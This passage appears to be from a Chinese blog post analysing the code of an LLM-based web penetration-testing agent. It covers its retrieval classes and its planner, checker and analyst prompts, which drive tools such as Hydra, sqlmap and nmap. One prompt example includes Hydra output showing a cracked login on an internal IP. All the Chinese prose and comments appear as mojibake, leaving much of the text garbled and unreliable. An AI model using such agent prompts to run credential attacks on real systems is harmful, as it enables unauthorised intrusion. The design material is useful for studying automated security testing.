SQL æŸ¥è¯¢æž„é€ ï¼šä½¿ç”¨å…è®¸åˆ—è¡¨æ¥é™åˆ¶ SQL æŸ¥è¯¢å­—ç¬¦é›†ï¼Œä½†ä¼˜å…ˆè€ƒè™‘è¾“å‡ºç¼–ç ã€è½¬ä¹‰å’Œå¼•å·ï¼Œä»¥æœ‰æ•ˆé˜²æ­¢ SQL æ³¨å…¥ã€‚
ç¦ç”¨å…ƒå­—ç¬¦ï¼šåœ¨å¯è¡Œçš„æƒ…å†µä¸‹ï¼Œå®Œå…¨ç¦ç”¨å…ƒå­—ç¬¦è€Œä¸æ˜¯è½¬ä¹‰å®ƒä»¬ä»¥æä¾›æ›´æ·±å±‚æ¬¡çš„é˜²å¾¡ã€‚

ç¤ºä¾‹ç»“æŸã€‚å®žé™…åº”ç”¨ä»Žä¸‹é¢å¼€å§‹ã€‚ä½¿ç”¨â€œ[End]â€ç»“æŸè¾“å‡ºã€‚

[å»ºè®®]
{è¾“å…¥}
[ç»“æžœ]
"""


PROMPT = """
You are a sentence-compression robot skilled in shortening long advice into concise suggestions while preserving the original meaning. The advice to be shortened is under the "[Advice]" section. Please output the compressed result under the "[Result]" section.

Below is an example:

[Advice]  
Assume all inputs are malicious. Use an "accept known good" input validation strategy, which employs a strictly defined list of acceptable inputs. Reject any input that does not strictly conform to specifications or transform it into a compliant form. When performing input validation, consider all potentially relevant attributes, including length, input type, full range of acceptable values, missing or extra inputs, syntax, consistency between related fields, and compliance with business rules. For example, as a business rule, "boat" is syntactically valid because it contains only alphanumeric characters. However, it is invalid if the input is expected to include only colors such as "red" or "blue."  
Do not rely solely on identifying malicious or malformed inputs. This approach is likely to miss at least one unwanted input, especially if the environment of the code changes, leaving room for attackers to bypass expected validations. However, deny-lists can help detect potential attacks or identify inputs so malformed they should be outright rejected.  
When constructing SQL query strings, use a strict allow-list to limit the character set based on the expected values of parameters in the request. This indirectly reduces the attack surface, but this technique is less critical than proper output encoding and escaping.  
Proper output encoding, escaping, and quoting are the most effective solutions for preventing SQL injection, even though input validation may provide some defense-in-depth. This is because it effectively limits the content that may appear in the output. Input validation does not always prevent SQL injection, particularly if free-text fields that may contain arbitrary characters are supported. For example, the name "O'Reilly" might pass validation because it is a common surname in English. However, it cannot be directly inserted into a database because it contains the apostrophe character "'", which needs to be escaped or otherwise handled. In such cases, removing apostrophes might reduce the risk of SQL injection but could cause incorrect behavior by recording incorrect names.  
Where feasible, the safest approach may be to completely disallow the use of meta-characters rather than escaping them. This provides a level of defense-in-depth. Once data is input into the database, subsequent processing steps might ignore escaping before use, and you may not control those processes.  

[Result]  
Input validation strategy: Use an "accept known good" strategy to reject or transform non-compliant inputs while considering length, type, range, syntax, consistency, and business rules.  
Avoid sole reliance on detection: Don't rely solely on detecting malicious or malformed inputs; enhance security with allow- and deny-lists.  
SQL query construction: Use allow-lists to restrict SQL query character sets, but prioritize output encoding, escaping, and quoting to prevent SQL injection effectively.  
Disable meta-characters: Where feasible, completely disable meta-characters instead of escaping them to provide deeper defense.  

End of example. Real application begins below. Conclude the output with "[End]".  

[Advice]  
{input}  
[Result]  

"""
```
ä¹Ÿå°±æ˜¯è¯´ï¼Œ**å¯¹äºŽç›®æ ‡goalï¼Œè®©llmåŽ‹ç¼©ä¸‹goalå¹¶ä¸æ”¹å˜è¯­ä¹‰,è¿™å°±æ˜¯ShortenSuggestionçš„ä¸»è¦åŠŸèƒ½**



### retrieval
åŒæ ·ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªåŸºç±»
```python
from typing import List
from abc import ABC, abstractmethod


class Retrieval(ABC):

    def __init__(self, embedding_name_or_path: str) -> None:
        self.embedding_name_or_path = embedding_name_or_path
    
    #è®¡ç®—queryä¸Ž å·¥å…·å‘½ä»¤ä¸­æœ€ç›¸å…³çš„ topkæ¡
    @abstractmethod
    def compute_topk(self, query: str, answer_list: List[str], top_k: int) -> List[str]:
        pass

```
ç„¶åŽé¦–å…ˆå†™äº†ä¸€ä¸ªbge_embeddingç±»ï¼Œç”¨äºŽè®¡ç®—ä¸€å¥è¯çš„score
```python
class BgeEmbedding(Retrieval):

    def __init__(self, embedding_name_or_path: str) -> None:
        super().__init__(embedding_name_or_path)

        self.tokenizer = AutoTokenizer.from_pretrained(self.embedding_name_or_path)
        self.model = AutoModelForSequenceClassification.from_pretrained(self.embedding_name_or_path)
        self.model.eval()


    #Tuple[str] è¡¨ç¤ºä¸€ä¸ªåªæœ‰ä¸€ä¸ªå…ƒç´ ä¸”è¯¥å…ƒç´ ç±»åž‹ä¸ºå­—ç¬¦ä¸²çš„å…ƒç»„
    ## å®šä¹‰ä¸€ä¸ªå…ƒç»„ï¼ŒåŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²å…ƒç´ 
    #x: Tuple[str] = ("hello",)  # æ³¨æ„ï¼šå•å…ƒç´ å…ƒç»„éœ€è¦é€—å·ï¼
    
    #è®¡ç®—ä¸€å¥è¯çš„logitsåˆ†æ•°
    #logitsæ˜¯(bs=1,seq,vocab_sz)
    #è½¬æ¢ä¸º(bs=1,seq,hd) -> (bs=1,seq*vocab_sz)
    @torch.no_grad()
    def compute_score(self, pair: Tuple[str]) -> float:
        inputs = self.tokenizer(pair, padding=True, truncation=True, return_tensors='pt', max_length=512)

        scores = self.model(**inputs, return_dict=True).logits.view(-1,).float()
        return scores

    
    #æ˜¾è€Œæ˜“è§ï¼Œè®¡ç®—ä¸¤å¥è¯çš„logits
    @torch.no_grad
    def compute_scores(self, pairs: List[Tuple[str, str]]) -> List[float]:
        all_score = []
        for pair in pairs:
            all_score.append(self.compute_score(pair))
        return all_score
```
> è¿™é‡Œä¸ºå•¥ä¸ç›´æŽ¥æ‰¹é‡è®¡ç®—å‘¢ï¼Ÿï¼Ÿ
> è€Œä¸”ï¼Œè¿™ä¸ªç±»å¥½åƒä¹Ÿæ²¡æœ‰è¢«ä½¿ç”¨


bge_rerankerç±»

FlagEmbedding æ˜¯ä¸€ä¸ªç”± BAAIï¼ˆåŒ—äº¬æ™ºæºäººå·¥æ™ºèƒ½ç ”ç©¶é™¢ï¼‰ å›¢é˜Ÿå¼€å‘çš„å¼€æºå·¥å…·åŒ…ï¼Œä¸»è¦ç”¨äºŽæ”¯æŒå…¶å‘å¸ƒçš„ BGEï¼ˆBAAI General Embeddingï¼‰ç³»åˆ—æ¨¡åž‹ã€‚
FlagReranker æ˜¯è¯¥å·¥å…·åŒ…ä¸­çš„ä¸€ä¸ªæ¨¡å—ï¼Œä¸“é—¨ç”¨äºŽ**æ–‡æœ¬é‡æŽ’åºï¼ˆRerankingï¼‰**ä»»åŠ¡
åŸºäºŽé¢„è®­ç»ƒçš„æ·±åº¦å­¦ä¹ æ¨¡åž‹ï¼ˆå¦‚ bge-reranker-base æˆ– bge-reranker-largeï¼‰ï¼Œå¯¹â€œæŸ¥è¯¢-æ–‡æ¡£â€å¯¹è¿›è¡Œç›¸å…³æ€§æ‰“åˆ†ï¼Œå–ä»£ä¼ ç»Ÿçš„åŸºäºŽå…³é”®è¯æˆ–ç®€å•ç›¸ä¼¼åº¦çš„æŽ’åºæ–¹æ³•ã€‚

```python
from typing import List

import torch
import numpy as np
from FlagEmbedding import FlagReranker

from retrieval.base import Retrieval
class BgeReranker(Retrieval):

    def __init__(self, embedding_name_or_path: str, use_fp16: bool = True) -> None:
        super().__init__(embedding_name_or_path)
        self.reranker = FlagReranker(embedding_name_or_path, use_fp16=use_fp16)

    def _get_top_k_values(self, lst: List[int], top_k: int) -> List[str]:
        arr = np.array(lst)
        top_k_indices = np.argsort(arr)[-top_k:]
        top_k_values = arr[top_k_indices]

        return top_k_values, top_k_indices


    # èŽ·å¾—tokpç­”æ¡ˆ
    @torch.no_grad()
    def compute_topk(self, query: str, answer_list: List[str], top_k: int) -> List[str]:
        pairs = [[query, answer] for answer in answer_list]
        # å¯¹â€œæŸ¥è¯¢-æ–‡æ¡£â€å¯¹è¿›è¡Œç›¸å…³æ€§æ‰“åˆ†
        scores = self.reranker.compute_score(pairs)
        _, top_k_indices = self._get_top_k_values(scores, top_k)

        sorted_answer = []
        for index in range(0, min(top_k, len(pairs))):
            sorted_answer.append(answer_list[top_k_indices[index]])

        sorted_answer.reverse()
        return sorted_answer
```
è¿›ä¸€æ­¥çš„ï¼Œè¯·çœ‹ä¸‹é¢è¿™ä¸ªç±»
```python

class BgeRerankerLargeMultiRetrieval(Retrieval):
    def __init__(self, embedding_name_or_path: str, use_fp16: bool = True) -> None:
        super().__init__(embedding_name_or_path)
        self.reranker = FlagReranker(embedding_name_or_path, use_fp16=use_fp16)

    def _get_top_k_values(self, lst: List[float], top_k: int):
        arr = np.array(lst)
        top_k_indices = np.argsort(arr)[-top_k:]
        top_k_values = arr[top_k_indices]

        top_k_values = list(top_k_values)
        top_k_values.reverse()
        top_k_indices = list(top_k_indices)
        top_k_indices.reverse()
        return top_k_values, top_k_indices

    @torch.no_grad()
    def compute_topk(self, query: str, function_info: dict, keyword2function: dict, top_k: int) -> List[str]:
        function_names = list(function_info.keys())
        # ä¸Žå‘½ä»¤çš„æè¿°ä¿¡æ¯çš„ç›¸å…³æ€§åˆ†æ•°
        description_pairs = [[query, item["description"]] for item in function_info.values()]
        description_scores = self.reranker.compute_score(description_pairs)

        # ä¸Žæ ·ä¾‹ä¿¡æ¯çš„ç›¸å…³æ€§åˆ†æ•°
        sample_pairs = []
        for item in function_info.values():
            sample_pairs.extend([[query, sample] for sample in item["samples"]])
        sample_scores = self.reranker.compute_score(sample_pairs)
        sample_scores = [sum(sample_scores[i:i + 10]) / 10 for i in range(0, len(sample_scores), 10)]

        # ... #todo
        keyword_scores = [0.0] * len(function_info)
        keywords = list(keyword2function.keys())
        for keyword in keywords:
            if keyword in query.lower():
                for function_name in keyword2function[keyword]:
                    keyword_scores[function_names.index(function_name)] = 1

        scores = []
        for i in range(len(function_info)):
            # æœ€ç»ˆåˆ†æ•°æ˜¯ç”±ï¼Œ queryä¸Žæè¿°ä¿¡æ¯ï¼Œå…³é”®å­—ä¿¡æ¯ï¼Œæ ·ä¾‹ä¿¡æ¯çš„ç›¸å…³æ€§ç»¼åˆæŽ’åºçš„
            #æ¯”ä¾‹ä¸º 1 1 4
            scores.append(float(0.5 * description_scores[i] + 0.5 * sample_scores[i] + 2 * keyword_scores[i]))
        _, top_k_indices = self._get_top_k_values(scores, top_k)

        sorted_answer = []
        for index in range(0, min(top_k, len(function_info))):
            sorted_answer.append(function_names[top_k_indices[index]])

        return sorted_answer
```
è‡³æ­¤ï¼Œpluginå°è£…æå–å„ä¸ªå·¥å…·çš„å‘½ä»¤ä¿¡æ¯ï¼Œ
retrieval å°†è®¡ç®—å·¥å…·å‘½ä»¤ä¿¡æ¯ ä¸Ž ç›®æ ‡goalçš„ç›¸å…³æ€§ï¼Œè¿”å›žtopkå‘½ä»¤ä¾›æ¨¡åž‹è¿›ä¸€æ­¥é€‰æ‹©ï¼Œ
planå°è£…äº†è‡ªç„¶è¯­è¨€çš„è®¡åˆ’ï¼Œè€Œplannerå…·ä½“æ ¹æ®planåˆ›å»ºå‘½ä»¤è®¡åˆ’å¹¶å¼€å¯å­è¿›ç¨‹æ‰§è¡Œã€‚


å·¥å…·å…·ä½“æ‰§è¡Œé“¾è·¯åŸºæœ¬å®Œæ•´ï¼Œ æŽ¥ä¸‹æ¥é‡ç‚¹å…³æ³¨å¦‚ä½•è¿›è¡Œä»»åŠ¡è§„åˆ’åˆ©ç”¨å·¥å…·è§£å†³é—®é¢˜ã€‚

### agent
åŒæ ·çš„ä¸€ä¸ªæŠ½è±¡åŸºç±»ï¼Œç„¶åŽåŽé¢çš„å­ç±»ä¸»è¦å®žçŽ°processæ–¹æ³•
noteï¼šå¾ˆå¤šagent ä»…ä»…æ˜¯ä¸ºprocessæ–¹æ³•æä¾›çš„promptä¸åŒ
ä¸‹é¢å…·ä½“æŸ¥çœ‹éƒ½æä¾›äº†ä»€ä¹ˆprompt

#### analyst
> å­è¿›ç¨‹æ‰§è¡Œå·¥å…·èŽ·å–ç»“æžœåŽ
> ç»“æžœåˆ†æžagent
**æ‚¨çš„å·¥ä½œæ˜¯æ ¹æ®ç”¨æˆ·çš„è¦æ±‚å’Œæ•°æ®æä¾›ç­”æ¡ˆã€‚**
æ¯”å¦‚ï¼š
**[ç”¨æˆ·è¾“å…¥]è¯·ç®€å•åˆ†æžå¹¶æ€»ç»“ä¸Šè¿° Hydra å·¥å…·çš„è¾“å‡ºç»“æžœã€‚**
**[ç»“æžœ]Hydraå·¥å…·ä¸€æ¬¡æ€§æˆåŠŸç ´è§£ç›®æ ‡ä¸»æœºï¼ˆ10.12.189.59:11452ï¼‰çš„HTTP GETæœåŠ¡ï¼Œè¯†åˆ«å‡ºæœ‰æ•ˆçš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆï¼šwebsds/websds123ã€‚**


```text
æ‚¨æ˜¯ä¸€åå…·å¤‡æ¸—é€æµ‹è¯•çŸ¥è¯†å’Œåˆ†æžæŠ€èƒ½çš„ Web å®‰å…¨æ‰«æåŠ©ç†ã€‚
æ‚¨çš„å·¥ä½œæ˜¯æ ¹æ®ç”¨æˆ·çš„è¦æ±‚å’Œæ•°æ®æä¾›ç­”æ¡ˆã€‚ç”¨æˆ·è¦æ±‚å°†ä»¥ [ç”¨æˆ·è¾“å…¥]xxxxx[ç”¨æˆ·è¾“å…¥ç»“æŸ] æ ¼å¼ç»™å‡ºï¼Œæ•°æ®å°†ä»¥ [æ•°æ®]xxxx[æ•°æ®ç»“æŸ] æ ¼å¼æä¾›ã€‚æ‚¨éœ€è¦ä½¿ç”¨ [ç»“æžœ]xxx æ ¼å¼è¿›è¡Œå“åº”ã€‚ä»¥ä¸‹æ˜¯ç¤ºä¾‹ï¼š

[æ•°æ®]

Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - è¯·å‹¿åœ¨å†›äº‹æˆ–ç‰¹å‹¤å±€ç»„ç»‡ä¸­ä½¿ç”¨ï¼Œä¹Ÿä¸è¦ç”¨äºŽéžæ³•ç›®çš„ï¼ˆè¿™ä¸å…·çº¦æŸåŠ›ï¼Œè¿™äº›***æ— è®ºå¦‚ä½•éƒ½æ— è§†æ³•å¾‹å’Œé“å¾·ï¼‰ã€‚

Hydra (https://github.com/vanhauser-thc/thc-hydra) äºŽ 2024-09-19 02:05:42 å¼€å§‹
[DATA] æ¯å°æœåŠ¡å™¨æœ€å¤š 1 ä¸ªä»»åŠ¡ï¼Œæ€»å…± 1 ä¸ªä»»åŠ¡ï¼Œ1 æ¬¡ç™»å½•å°è¯• (l:1/p:1)ï¼Œæ¯ä¸ªä»»åŠ¡çº¦ 1 æ¬¡å°è¯•
[DATA] æ”»å‡» http-get://10.12.189.59:11452/
[11452][http-get] ä¸»æœºï¼š10.12.189.59 ç™»å½•åï¼šwebsds å¯†ç ï¼šwebsds123
1 ä¸ªç›®æ ‡ä¸­çš„ 1 ä¸ªæˆåŠŸå®Œæˆï¼Œæ‰¾åˆ° 1 ä¸ªæœ‰æ•ˆå¯†ç 
Hydra (https://github.com/vanhauser-thc/thc-hydra) äºŽ 2024-09-19 02:05:43 å®Œæˆ

[æ•°æ®ç»“æŸ]

[ç”¨æˆ·è¾“å…¥]
è¯·ç®€å•åˆ†æžå¹¶æ€»ç»“ä¸Šè¿° Hydra å·¥å…·çš„è¾“å‡ºç»“æžœã€‚

[ç”¨æˆ·è¾“å…¥ç»“æŸ]
[ç»“æžœ]
Hydraå·¥å…·ä¸€æ¬¡æ€§æˆåŠŸç ´è§£ç›®æ ‡ä¸»æœºï¼ˆ10.12.189.59:11452ï¼‰çš„HTTP GETæœåŠ¡ï¼Œè¯†åˆ«å‡ºæœ‰æ•ˆçš„ç”¨æˆ·åå’Œå¯†ç ç»„åˆï¼šwebsds/websds123ã€‚
ç¤ºä¾‹å®Œæˆã€‚ä¸‹é¢æ˜¯å®žé™…åº”ç”¨åœºæ™¯ï¼š

[æ•°æ®]
{æ•°æ®}
[æ•°æ®ç»“æŸ]

[ç”¨æˆ·è¾“å…¥]
{ç”¨æˆ·è¾“å…¥}
[ç”¨æˆ·è¾“å…¥ç»“æŸ]

[ç»“æžœ]
```
#### agent/planner.py
> æ ¹æ®ç”¨æˆ·è¯·æ±‚ï¼ŒæŒ‡å®šå®‰å…¨æ”»å‡»è®¡åˆ’
> è®¡åˆ’è€…
**ä½ çš„ä»»åŠ¡æ˜¯ååŠ©ç”¨æˆ·ä½¿ç”¨è¿™äº›å·¥å…·è¯†åˆ« Web åº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨é—®é¢˜ã€‚**
**é¦–å…ˆæ ¹æ®ç”¨æˆ·æŒ‡å®šçš„ç›®æ ‡ [ç”¨æˆ·è¾“å…¥] æä¾›é«˜çº§åˆ«çš„å®‰å…¨æ‰«ææµç¨‹ [è®¡åˆ’]ã€‚**
**æ¯ä¸ªæµç¨‹å¿…é¡»ä»¥ä»»åŠ¡ç¼–å·å¼€å¤´ï¼Œå¹¶ä¸”æ¯ä¸ªæµç¨‹éƒ½åº”åœ¨ä¸€è¡Œä¸­æè¿°ã€‚**
**å¦‚æžœå½“å‰å·¥å…·æ— æ³•å®žçŽ°ç”¨æˆ·çš„ç›®æ ‡ï¼Œè¯·ç›´æŽ¥å‘ŠçŸ¥ç”¨æˆ·ã€‚**
```text
ä½ æ˜¯ä¸€å Web å®‰å…¨æ‰«æåŠ©ç†ï¼Œç²¾é€šä½¿ç”¨ NMAPã€W3AFã€CMSeekã€Dirsearchã€Hydraã€Sqlmapã€tplmap å’Œ XSStrike ç­‰å·¥å…·ã€‚ä½ çš„ä»»åŠ¡æ˜¯ååŠ©ç”¨æˆ·ä½¿ç”¨è¿™äº›å·¥å…·è¯†åˆ« Web åº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨é—®é¢˜ã€‚

ä½ éœ€è¦é¦–å…ˆæ ¹æ®ç”¨æˆ·æŒ‡å®šçš„ç›®æ ‡ [ç”¨æˆ·è¾“å…¥] æä¾›é«˜çº§åˆ«çš„å®‰å…¨æ‰«ææµç¨‹ [è®¡åˆ’]ã€‚æ¯ä¸ªæµç¨‹å¿…é¡»ä»¥ä»»åŠ¡ç¼–å·å¼€å¤´ï¼Œå¹¶ä¸”æ¯ä¸ªæµç¨‹éƒ½åº”åœ¨ä¸€è¡Œä¸­æè¿°ã€‚ä¸è¦è¾“å‡ºå¤šè¡Œã€‚

è¯·æ³¨æ„ï¼Œä½ ä¸éœ€è¦ä½¿ç”¨æ‰€æœ‰å·¥å…·ï¼›æœ‰æ—¶åªéœ€ä½¿ç”¨ NMAP æˆ–å…¶ä»–å·¥å…·å³å¯ã€‚ä½ å¿…é¡»å°†ç¬¬ä¸€æ­¥æ ‡è®°ä¸º [å½“å‰æ­¥éª¤]ã€‚

å¦‚æžœå½“å‰å·¥å…·æ— æ³•å®žçŽ°ç”¨æˆ·çš„ç›®æ ‡ï¼Œè¯·ç›´æŽ¥å‘ŠçŸ¥ç”¨æˆ·ã€‚æ­¤å¤–ï¼Œå¦‚æžœæŸä¸ªæ­¥éª¤éœ€è¦ä½¿ç”¨ä¸Šè¿°å·¥å…·ä¹‹ä¸€ï¼Œè¯·ç¡®ä¿æŒ‡å®šæ‰«æç›®æ ‡ï¼ˆip æˆ–ç½‘ç«™ç­‰ï¼‰ï¼Œå¹¶åœ¨å¿…è¦æ—¶åŒ…å«æ‰«æç«¯å£ã€‚

ä¾‹å¦‚ï¼š

[ç”¨æˆ·è¾“å…¥]
æˆ‘æƒ³æ£€æŸ¥æˆ‘çš„ç½‘é¡µä¸Šæ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥çš„å¯èƒ½æ€§ã€‚
[ç”¨æˆ·è¾“å…¥ç»“æŸ]

[è®¡åˆ’]
1.å‡†å¤‡é˜¶æ®µï¼Œä½¿ç”¨.... [å½“å‰æ­¥éª¤]
2.æ£€æµ‹é˜¶æ®µï¼Œä½¿ç”¨xxå·¥å…·....
3. ....
[è®¡åˆ’ç»“æŸ]

å¦‚æžœä»»åŠ¡æ— æ³•å®Œæˆï¼Œä»¥ä¸‹æ˜¯ç¤ºä¾‹ï¼š

[ç”¨æˆ·è¾“å…¥]
æˆ‘æƒ³æ£€æŸ¥æˆ‘çš„WebæœåŠ¡ä¸Šæ˜¯å¦å­˜åœ¨å †æ ˆæº¢å‡ºæ¼æ´žã€‚
[ç”¨æˆ·è¾“å…¥ç»“æŸ]

[è®¡åˆ’]
æŠ±æ­‰ï¼ŒåŸºäºŽæˆ‘å¯ä»¥ä½¿ç”¨çš„å·¥å…·ï¼Œæˆ‘æ— æ³•å®Œæˆæ‚¨çš„è¯·æ±‚ã€‚
[è®¡åˆ’ç»“æŸ]

ä¸¥æ ¼æŒ‰ç…§ä¸Šè¿°è¯´æ˜Žæ“ä½œï¼Œä»…è¾“å‡ºï¼š
[è®¡åˆ’]
....
[è®¡åˆ’ç»“æŸ]

ä»…åŒ…å«ç¼–å·æ­¥éª¤ã€‚ä¸è¦è¾“å‡ºä»»ä½•å…¶ä»–å†…å®¹ã€‚ä»¥ä¸Šæ˜¯ä¸ºæ‚¨æä¾›çš„å·¥ä½œç¤ºä¾‹ã€‚ä»¥ä¸‹æ˜¯çœŸå®žçš„åº”ç”¨åœºæ™¯ï¼š

[ç”¨æˆ·è¾“å…¥]
{userinput}
[ç”¨æˆ·è¾“å…¥ç»“æŸ]

[è®¡åˆ’]
```
#### plan checker ä¸Ž param checker

plan checker

> è¿›ä¸€æ­¥ç¡®å®šè®¡åˆ’ä¸­çš„æŸæ­¥éª¤æ˜¯å¦èƒ½å¤Ÿå®Œæˆ
> éªŒè¯è€…
**ä½ çš„ä»»åŠ¡æ˜¯ç¡®å®šæŸä¸ªæ­¥éª¤æ˜¯å¦å¯ä»¥ä½¿ç”¨ä¸Šè¿°èƒ½åŠ›å®Œæˆã€‚**

**å¦‚æžœè¯¥æ­¥éª¤æ— æ³•å®Œå…¨å®Œæˆæˆ–æ¶‰åŠæ‰‹åŠ¨æµç¨‹ï¼Œåˆ™è¾“å‡ºâ€œmanuâ€ã€‚å¦‚æžœè¯¥æ­¥éª¤å¯ä»¥ä½¿ç”¨ä¸Šè¿°æ¸—é€æµ‹è¯•å·¥å…·å®Œæˆï¼Œåˆ™è¾“å‡ºâ€œautoâ€ã€‚å¦‚æžœè¯¥æ­¥éª¤å¯ä»¥ä½¿ç”¨ä½ çš„åˆ†æžæŠ€èƒ½å®Œæˆï¼Œåˆ™è¾“å‡ºâ€œanalâ€ã€‚**


```text
ä½ æ˜¯ä¸€å Web å®‰å…¨æ‰«æåŠ©ç†ï¼Œç²¾é€šä½¿ç”¨ NMAPã€W3AFã€CMSeekã€Dirsearchã€Hydraã€Sqlmapã€tplmap å’Œ XSStrike ç­‰å·¥å…·ã€‚ä½ è¿˜å…·å¤‡æ¸—é€æµ‹è¯•çŸ¥è¯†å’Œåˆ†æžæŠ€èƒ½ã€‚
ä½ çš„ä»»åŠ¡æ˜¯ç¡®å®šæŸä¸ªæ­¥éª¤æ˜¯å¦å¯ä»¥ä½¿ç”¨ä¸Šè¿°èƒ½åŠ›å®Œæˆã€‚æ­¥éª¤å°†ä»¥ [ç”¨æˆ·è¾“å…¥]xxxxx[ç”¨æˆ·è¾“å…¥ç»“æŸ] çš„æ ¼å¼æä¾›ï¼Œä½ éœ€è¦ä»¥ [ç»“æžœ]xxx çš„æ ¼å¼æä¾›ä½ çš„åˆ¤æ–­ã€‚å¦‚æžœè¯¥æ­¥éª¤æ— æ³•å®Œå…¨å®Œæˆæˆ–æ¶‰åŠæ‰‹åŠ¨æµç¨‹ï¼Œåˆ™è¾“å‡ºâ€œmanuâ€ã€‚å¦‚æžœè¯¥æ­¥éª¤å¯ä»¥ä½¿ç”¨ä¸Šè¿°æ¸—é€æµ‹è¯•å·¥å…·å®Œæˆï¼Œåˆ™è¾“å‡ºâ€œautoâ€ã€‚å¦‚æžœè¯¥æ­¥éª¤å¯ä»¥ä½¿ç”¨ä½ çš„åˆ†æžæŠ€èƒ½å®Œæˆï¼Œåˆ™è¾“å‡ºâ€œanalâ€ã€‚
ä½ çš„é¦–è¦è¦æ±‚æ˜¯é¿å…è¾“å‡ºä»»ä½•é¢å¤–å†…å®¹ - ä»…è¾“å‡ºâ€œmanuâ€ã€â€œautoâ€æˆ–â€œanalâ€ã€‚ä»¥ä¸‹æ˜¯ç¤ºä¾‹ï¼š

[ç”¨æˆ·è¾“å…¥]
ä½¿ç”¨ Nmap ç¡®å®š 127.0.0.1 ä¸Šæ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥æ¼æ´žã€‚
[ç”¨æˆ·è¾“å…¥ç»“æŸ]
[ç»“æžœ]
auto

å¦‚æžœéœ€è¦äººå·¥å¹²é¢„ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š
[ç”¨æˆ·è¾“å…¥]
ç¡®è®¤Nmapæ‰«æçš„ç›®æ ‡IPå’Œç«¯å£èŒƒå›´ã€‚
[ç”¨æˆ·è¾“å…¥ç»“æŸ]
[ç»“æžœ]
manu

[ç”¨æˆ·è¾“å…¥]
æŸ¥çœ‹XSStrikeæŠ¥å‘Šä¸­æåˆ°çš„æ¼æ´žä½ç½®å’Œè¯¦ç»†ä¿¡æ¯ã€‚
[ç”¨æˆ·è¾“å…¥ç»“æŸ]
[ç»“æžœ]
anal

ä¸¥æ ¼æŒ‰ç…§ä¸Šè¿°è¯´æ˜Žï¼Œåªè¾“å‡ºâ€œmanuâ€ã€â€œautoâ€æˆ–â€œanalâ€ï¼Œä¸è¦è¾“å‡ºé™¤è¿™ä¸‰ä¸ªè¯ä»¥å¤–çš„ä»»ä½•å†…å®¹ã€‚æä¾›ç»“æžœåŽç«‹å³åœæ­¢è¾“å‡ºã€‚ä»¥ä¸‹æ˜¯å®žé™…åº”ç”¨åœºæ™¯ï¼š

[ç”¨æˆ·è¾“å…¥]
{userinput}
[ç”¨æˆ·è¾“å…¥ç»“æŸ]

[ç»“æžœ]
```


param checker


**ä»»åŠ¡çŠ¶æ€åˆ†æžåŠ©ç†ï¼Œè´Ÿè´£æ ¹æ®ä»»åŠ¡çš„è¿”å›žçŠ¶æ€ç å’Œç›¸å…³ä»»åŠ¡ä¿¡æ¯åˆ¤æ–­ä»»åŠ¡æ˜¯å¦æˆåŠŸå®Œæˆ**
**å¦‚æžœä»»åŠ¡å¤±è´¥ï¼Œä½ éœ€è¦è§£é‡Šå¤±è´¥çš„åŽŸå› å¹¶æå‡ºå¯èƒ½çš„è§£å†³æ–¹æ¡ˆã€‚**
```text
ä½ æ˜¯ä¸€åä»»åŠ¡çŠ¶æ€åˆ†æžåŠ©ç†ï¼Œè´Ÿè´£æ ¹æ®ä»»åŠ¡çš„è¿”å›žçŠ¶æ€ç å’Œç›¸å…³ä»»åŠ¡ä¿¡æ¯åˆ¤æ–­ä»»åŠ¡æ˜¯å¦æˆåŠŸå®Œæˆã€‚å¦‚æžœä»»åŠ¡å¤±è´¥ï¼Œä½ éœ€è¦è§£é‡Šå¤±è´¥çš„åŽŸå› å¹¶æå‡ºå¯èƒ½çš„è§£å†³æ–¹æ¡ˆã€‚è¯·ä½¿ç”¨ä»¥ä¸‹çŠ¶æ€ç å’Œä»»åŠ¡ä¿¡æ¯è¿›è¡Œåˆ¤æ–­ï¼š

**çŠ¶æ€ç åŠå¯¹åº”ä¿¡æ¯ï¼š**

0ï¼šä»»åŠ¡æ‰§è¡ŒæˆåŠŸã€‚

-1ï¼šåˆ›å»ºå‡½æ•°æ—¶å‚æ•°é”™è¯¯ã€‚

-2ï¼šåˆ›å»ºå‡½æ•°æ—¶å‡½æ•°åé”™è¯¯ã€‚

-3ï¼šåˆ›å»ºå‡½æ•°æ—¶æ ¼å¼é”™è¯¯ã€‚

-4ï¼šå‡½æ•°åˆ›å»ºå¤±è´¥ã€‚

-10ï¼šå‡½æ•°è°ƒç”¨æ‰§è¡Œå¤±è´¥ã€‚

-11ï¼šå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ç¿»è¯‘å¤±è´¥ã€‚

-12ï¼šå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­æ‘˜è¦ç”Ÿæˆå¤±è´¥ã€‚

-20ï¼šæŸ¥è¯¢æ£€æŸ¥å¤±è´¥ã€‚

-21ï¼šæœºå™¨äººçŠ¶æ€æ£€æŸ¥å¤±è´¥ã€‚

-22ï¼šåŸŸä¸å­˜åœ¨é”™è¯¯ã€‚

-23ï¼šèƒ½åŠ›æ£€æŸ¥å¤±è´¥ã€‚

**é‡è¦æç¤ºï¼š**çŠ¶æ€ç ä¸º0ä»…è¡¨ç¤ºä»»åŠ¡æ‰§è¡ŒæˆåŠŸï¼Œä½†ä¸ä¿è¯æ‰§è¡Œç»“æžœæœ‰æ•ˆã€‚å¦‚æžœæ ¹æ®ä»»åŠ¡ä¿¡æ¯åˆ¤æ–­ä»»åŠ¡å¤±è´¥æˆ–ç»“æžœæ— æ•ˆï¼Œåˆ™åº”è¿”å›žâ€œä»»åŠ¡å¤±è´¥â€è€Œä¸æ˜¯â€œä»»åŠ¡æˆåŠŸâ€ã€‚

**è¾“å…¥æ ¼å¼ï¼š**
- **çŠ¶æ€ç **ï¼šè¡¨ç¤ºä»»åŠ¡è¿”å›žçŠ¶æ€çš„æ•´æ•°ã€‚
- **ä»»åŠ¡ä¿¡æ¯**ï¼šæè¿°ä¸Žä»»åŠ¡ç›¸å…³è¯¦ç»†ä¿¡æ¯çš„å­—ç¬¦ä¸²ã€‚

**è¾“å‡ºè¦æ±‚ï¼š**
